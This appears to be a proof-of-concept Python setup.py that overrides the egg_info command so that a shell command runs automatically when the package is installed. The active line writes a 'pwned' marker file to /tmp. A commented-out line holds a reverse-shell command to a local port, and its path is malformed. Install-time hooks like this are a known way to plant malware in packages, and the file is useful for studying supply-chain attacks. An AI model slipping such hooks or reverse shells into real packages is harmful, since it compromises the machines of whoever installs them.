# setup.py
from setuptools import setup, find_packages
from setuptools.command.egg_info import egg_info
import os

class RunEggInfoCommand(egg_info):
    def run(self):
        os.system("echo 'You Have been pwned' > /tmp/pwned")
	#os.system("bash -i >& /dev/127.0.0.1/1234/ 0>&1")
        egg_info.run(self)

# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  

